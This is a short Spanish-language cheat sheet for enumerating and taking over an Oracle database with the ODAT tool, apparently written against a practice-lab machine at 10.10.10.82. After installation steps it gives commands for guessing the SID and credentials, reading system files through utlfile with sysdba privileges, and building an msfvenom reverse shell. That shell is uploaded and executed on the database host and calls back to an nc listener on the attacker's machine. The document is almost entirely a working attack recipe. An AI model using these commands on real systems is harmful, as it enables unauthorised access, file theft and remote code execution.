
# ENUMERACIÓN (ODAT)
### INSTALACIÓN
```shell
❯ git clone https://github.com/quentinhardy/odat.git
❯ cd odat/
❯ git submodule init
❯ git submodule update
❯ sudo apt-get install libaio1 python3-dev alien python3-pip
❯ mkdir installation
❯ cd installation
❯ wget https://download.oracle.com/otn_software/linux/instantclient/2115000/oracle-instantclient-devel-21.15.0.0.0-1.el8.x86_64.rpm
❯ wget https://download.oracle.com/otn_software/linux/instantclient/2115000/oracle-instantclient-sqlplus-21.15.0.0.0-1.el8.x86_64.rpm
❯ wget https://download.oracle.com/otn_software/linux/instantclient/2115000/oracle-instantclient-basic-21.15.0.0.0-1.el8.x86_64.rpm
❯ sudo alien --to-deb *
❯ sudo dpkg -i *.deb
❯ nvim ~/.zshrc
export ORACLE_HOME=/usr/lib/oracle/21/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
❯ pip3 install cx_Oracle --break-system-packages
```

### SID
```shell
❯ python3 odat.py sidguesser -s 10.10.10.82
```

### CREDENCIALES
```shell
python3 odat.py passwordguesser -s 10.10.10.82 -d XE #AGREGAR EL SID DE ANTES
```


```shell
❯ python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --getFile /Windows/System32/Drivers/etc/ hosts hosts
```


### DESCARGAR EL ETC HOSTS (SYSOPER)
```shell
❯ python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --getFile /Windows/System32/Drivers/etc/ hosts hosts --sysoper
```


### DESCARGAR EL ETC HOSTS (sysdba)
```shell
❯ python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --getFile /Windows/System32/Drivers/etc/ hosts hosts --sysdba
```


### REVERSE SHELL
```shell
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.4 LPORT=443 -f exe -o shell.exe
❯ python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --putFile /Windows/Temp shell.exe shell.exe --sysdba #SI DA ERROR CAMBIA EL DIRECTORIO TEMP O LOS PRIVILEGIOS.

❯ sudo rlwrap nc -nlvp 443
❯ python3 odat.py externaltable -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --exec /Windows/Temp shell.exe --sysdba
```

